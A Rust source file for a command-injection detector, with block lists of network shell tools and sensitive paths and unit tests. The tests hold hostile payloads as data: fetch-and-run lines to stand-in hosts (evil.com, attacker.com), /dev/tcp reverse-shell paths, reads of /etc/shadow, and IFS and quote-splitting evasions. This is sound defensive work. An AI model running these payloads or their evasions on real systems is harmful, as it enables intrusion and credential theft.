//! Command Injection (CMDi) Semantic Detector (W17-R-01).
//!
//! Lexical and syntactic analysis of shell command injections across Unix (bash, sh)
//! and Windows (cmd.exe, powershell). Detects command separators, chaining operators,
//! command substitution, pipes, and dangerous shell invocations while avoiding false
//! positives on benign natural language, URLs, and code snippets.
#![forbid(unsafe_code)]

/// Dangerous shell commands commonly leveraged in command injection and RCE attacks.
const DANGEROUS_COMMANDS: &[&[u8]] = &[
    b"cat",
    b"whoami",
    b"uname",
    b"id",
    b"pwd",
    b"hostname",
    b"ls",
    b"curl",
    b"wget",
    b"nc",
    b"netcat",
    b"ncat",
    b"socat",
    b"ping",
    b"traceroute",
    b"bash",
    b"sh",
    b"zsh",
    b"ksh",
    b"csh",
    b"dash",
    b"python",
    b"python3",
    b"perl",
    b"ruby",
    b"php",
    b"node",
    b"chmod",
    b"chown",
    b"kill",
    b"killall",
    b"rm",
    b"cp",
    b"mv",
    b"mkdir",
    b"touch",
    b"find",
    b"grep",
    b"awk",
    b"sed",
    b"head",
    b"tail",
    b"more",
    b"less",
    b"echo",
    b"printf",
    b"env",
    b"printenv",
    b"export",
    b"set",
    b"ps",
    b"top",
    b"ifconfig",
    b"ip",
    b"netstat",
    b"route",
    b"iptables",
    b"sudo",
    b"su",
    b"passwd",
    b"shadow",
    b"dd",
    b"tar",
    b"gzip",
    b"gunzip",
    b"zip",
    b"unzip",
    b"sleep",
    // Windows commands & utilities
    b"cmd",
    b"cmd.exe",
    b"powershell",
    b"powershell.exe",
    b"pwsh",
    b"dir",
    b"type",
    b"net",
    b"ipconfig",
    b"certutil",
    b"bitsadmin",
    b"calc",
    b"calc.exe",
    b"reg",
    b"wmic",
    b"tasklist",
    b"taskkill",
];

/// Sensitive paths that indicate Unix command execution when accessed in shell context.
const SENSITIVE_PATHS: &[&[u8]] = &[
    b"/etc/passwd",
    b"/etc/shadow",
    b"/etc/hosts",
    b"/etc/group",
    b"/dev/null",
    b"/dev/tcp",
    b"/dev/udp",
    b"/bin/sh",
    b"/bin/bash",
    b"/usr/bin/sh",
    b"/usr/bin/bash",
    b"/bin/cat",
    b"/bin/ls",
    b"/bin/nc",
    b"/usr/bin/id",
    b"/usr/bin/whoami",
];

/// Checks if a character is a shell separator or command chaining operator.
#[inline]
fn is_shell_separator(b: u8) -> bool {
    matches!(b, b';' | b'|' | b'&' | b'`' | b'\n' | b'\r')
}

/// Normalizes a command token by stripping common shell obfuscation (quotes, backslashes).
fn clean_token<'a>(s: &'a [u8], buf: &'a mut [u8; 64]) -> &'a [u8] {
    let mut out_len = 0;
    for &c in s {
        if c == b'\'' || c == b'"' || c == b'\\' {
            continue;
        }
        if out_len < buf.len() {
            buf[out_len] = c.to_ascii_lowercase();
            out_len += 1;
        } else {
            break;
        }
    }
    &buf[..out_len]
}

/// Detects Command Injection (CMDi) in an arbitrary byte slice.
pub fn detect(input: &[u8]) -> bool {
    if input.is_empty() {
        return false;
    }

    // 0. Direct command invocation at start of input (e.g. "sleep 5", "cat /etc/passwd")
    let trimmed = skip_shell_whitespace(input, 0);
    if trimmed < input.len() && starts_with_dangerous_command(&input[trimmed..]) {
        return true;
    }

    // 0b. Direct shell IFS evasion: $IFS or ${IFS}
    if input.windows(4).any(|w| w == b"$IFS") || input.windows(6).any(|w| w == b"${IFS}") {
        return true;
    }

    // 1. Direct sensitive path execution or access in shell context
    for path in SENSITIVE_PATHS {
        if let Some(pos) = input.windows(path.len()).position(|w| w == *path) {
            // Check preceding context: must be command or argument separator
            if pos == 0 || input[pos - 1].is_ascii_whitespace() || is_shell_separator(input[pos - 1]) || input[pos - 1] == b'<' || input[pos - 1] == b'>' {
                return true;
            }
        }
    }

    // 2. Direct dangerous command execution with flags or arguments:
    // e.g. "sleep 5", "cat /etc/passwd", "curl -O ...", "rm -rf ..."
    if starts_with_dangerous_command(input) {
        let mut buf = [0u8; 64];
        let (token, raw_len) = extract_first_token(input, &mut buf);
        let rem_idx = skip_shell_whitespace(input, raw_len);
        if rem_idx < input.len() {
            let rem = &input[rem_idx..];
            if rem.starts_with(b"-")
                || rem.starts_with(b"/")
                || rem.starts_with(b"\\")
                || rem.starts_with(b"http://")
                || rem.starts_with(b"https://")
                || (token == b"sleep" && rem.iter().any(|&c| c.is_ascii_digit()))
                || rem.starts_with(b"<")
                || rem.starts_with(b">")
            {
                return true;
            }
        }
    }

    // 2. Command substitution: $(...) or `...`
    // Backticks `...`
    let mut i = 0;
    while i < input.len() {
        if input[i] == b'`'
            && let Some(end) = input[i + 1..].iter().position(|&c| c == b'`')
        {
            let inner = &input[i + 1..i + 1 + end];
            if contains_command_invocation(inner) {
                return true;
            }
            i += 1 + end + 1;
            continue;
        }
        // $(...)
        if input[i] == b'$'
            && i + 1 < input.len()
            && input[i + 1] == b'('
            && let Some(end) = input[i + 2..].iter().position(|&c| c == b')')
        {
            let inner = &input[i + 2..i + 2 + end];
            if contains_command_invocation(inner) {
                return true;
            }
            i += 2 + end + 1;
            continue;
        }
        i += 1;
    }

    // 3. Shell chaining operators followed by dangerous commands
    // Scans for: ; cmd, | cmd, || cmd, && cmd, & cmd, \n cmd
    let len = input.len();
    let mut idx = 0;
    while idx < len {
        let b = input[idx];
        if is_shell_separator(b) {
            // Advance past consecutive separators like &&, ||
            let mut next_idx = idx + 1;
            while next_idx < len && is_shell_separator(input[next_idx]) {
                next_idx += 1;
            }
            // Skip whitespace, quotes, or ${IFS}
            next_idx = skip_shell_whitespace(input, next_idx);
            if next_idx < len {
                let remainder = &input[next_idx..];
                if starts_with_dangerous_command(remainder) {
                    return true;
                }
            }
        }
        idx += 1;
    }

    // 4. Windows / Shell direct execution prefixes:
    // e.g. "cmd.exe /c ...", "powershell -enc ...", "/bin/sh -c ..."
    if starts_with_shell_interpreter(input) {
        return true;
    }

    // 5. Pipe into shell interpreter: e.g. "... | sh", "... | bash", "... | powershell"
    if let Some(pipe_pos) = input.iter().position(|&c| c == b'|') {
        let after_pipe = skip_shell_whitespace(input, pipe_pos + 1);
        if after_pipe < len {
            let rem = &input[after_pipe..];
            let mut buf = [0u8; 64];
            let (token, _) = extract_first_token(rem, &mut buf);
            if matches!(token, b"sh" | b"bash" | b"zsh" | b"ksh" | b"csh" | b"cmd" | b"powershell" | b"pwsh") {
                return true;
            }
        }
    }

    // 6. Output redirection to system files or reverse shell descriptors: "2>&1", "> /dev/null", "/dev/tcp/..."
    if input.windows(4).any(|w| w == b"2>&1")
        || input.windows(9).any(|w| w == b"/dev/tcp/")
        || input.windows(9).any(|w| w == b"/dev/udp/")
    {
        return true;
    }

    false
}

/// Skips ASCII whitespace, tabs, and shell variable IFS representations (`${IFS}`, `$IFS`, `+`).
fn skip_shell_whitespace(input: &[u8], mut idx: usize) -> usize {
    let len = input.len();
    while idx < len {
        let b = input[idx];
        if b.is_ascii_whitespace() || b == b'+' {
            idx += 1;
        } else if input[idx..].starts_with(b"${IFS}") {
            idx += 6;
        } else if input[idx..].starts_with(b"$IFS") {
            idx += 4;
        } else {
            break;
        }
    }
    idx
}

/// Extracts the first command token from a slice, respecting quotes and backslashes.
fn extract_first_token<'a>(s: &'a [u8], buf: &'a mut [u8; 64]) -> (&'a [u8], usize) {
    let mut end = 0;
    while end < s.len() {
        let c = s[end];
        if c.is_ascii_whitespace() || is_shell_separator(c) || c == b'/' || c == b'\\' || c == b'<' || c == b'>' || c == b'+' || c == b'$' {
            break;
        }
        end += 1;
    }
    (clean_token(&s[..end], buf), end)
}

/// Checks if a string starts with a dangerous shell command followed by word boundary.
fn starts_with_dangerous_command(s: &[u8]) -> bool {
    let mut buf = [0u8; 64];
    let (token, raw_len) = extract_first_token(s, &mut buf);
    if token.is_empty() {
        return false;
    }

    for cmd in DANGEROUS_COMMANDS {
        if token == *cmd {
            // Verify token boundary in original slice
            if s.len() == raw_len {
                return true;
            }
            let next = s[raw_len];
            if next.is_ascii_whitespace()
                || is_shell_separator(next)
                || next == b'-'
                || next == b'/'
                || next == b'\\'
                || next == b'<'
                || next == b'>'
                || next == b'$'
                || next == b'+'
            {
                return true;
            }
        }
    }
    false
}

/// Checks if input represents an interpreter invocation such as "powershell -c ..." or "cmd.exe /c ...".
fn starts_with_shell_interpreter(s: &[u8]) -> bool {
    let trimmed = {
        let mut start = 0;
        while start < s.len() && s[start].is_ascii_whitespace() {
            start += 1;
        }
        &s[start..]
    };

    let mut buf = [0u8; 64];
    let (token, raw_len) = extract_first_token(trimmed, &mut buf);
    if matches!(
        token,
        b"powershell" | b"powershell.exe" | b"cmd" | b"cmd.exe" | b"pwsh"
    ) {
        let rem = skip_shell_whitespace(trimmed, raw_len);
        if rem < trimmed.len() {
            let next = trimmed[rem];
            if next == b'-' || next == b'/' {
                return true;
            }
        }
    }

    // "/bin/sh -c" or "/bin/bash -c"
    if trimmed.starts_with(b"/bin/sh")
        || trimmed.starts_with(b"/bin/bash")
        || trimmed.starts_with(b"/usr/bin/sh")
        || trimmed.starts_with(b"/usr/bin/bash")
    {
        return true;
    }

    false
}

/// Evaluates if an inner substituted string contains a command invocation.
fn contains_command_invocation(s: &[u8]) -> bool {
    let trimmed = {
        let mut start = 0;
        while start < s.len() && s[start].is_ascii_whitespace() {
            start += 1;
        }
        let mut end = s.len();
        while end > start && s[end - 1].is_ascii_whitespace() {
            end -= 1;
        }
        &s[start..end]
    };

    if trimmed.is_empty() {
        return false;
    }

    starts_with_dangerous_command(trimmed) || detect(trimmed)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_attacks_detected() {
        for attack in [
            &b"; cat /etc/passwd"[..],
            b";cat /etc/passwd",
            b"| whoami",
            b"|| whoami",
            b"&& id",
            b"& dir",
            b"127.0.0.1; ping 8.8.8.8",
            b"test;cat+/etc/passwd",
            b"test|whoami",
            b"`id`",
            b"`whoami`",
            b"$(uname -a)",
            b"$(cat /etc/shadow)",
            b";curl http://evil.com/shell.sh|sh",
            b"curl -O http://attacker.com/malware && chmod +x malware",
            b"cat$IFS/etc/passwd",
            b"cat${IFS}/etc/passwd",
            b"c'a't /etc/passwd",
            b"c\"a\"t /etc/passwd",
            b"cmd.exe /c dir",
            b"powershell.exe -enc AAAA",
            b"/bin/sh -c 'whoami'",
            b"foo; sleep 10",
            b"2>&1",
            b"/dev/tcp/10.0.0.1/4444",
        ] {
            assert!(detect(attack), "Expected attack detected: {}", attack.escape_ascii());
        }
    }

    #[test]
    fn test_benign_inputs_not_detected() {
        for benign in [
            &b"hello world"[..],
            b"category=books&sort=price",
            b"1 + 2 = 3; 4 + 5 = 9",
            b"Hello; nice to meet you",
            b"width: 100px; height: 50px;",
            b"category",
            b"concatenation",
            b"locate",
            b"indicator",
            b"user@example.com",
            b"https://example.com/api?id=1234&user=alice",
            b"",
        ] {
            assert!(!detect(benign), "Expected benign not detected: {}", benign.escape_ascii());
        }
    }
}
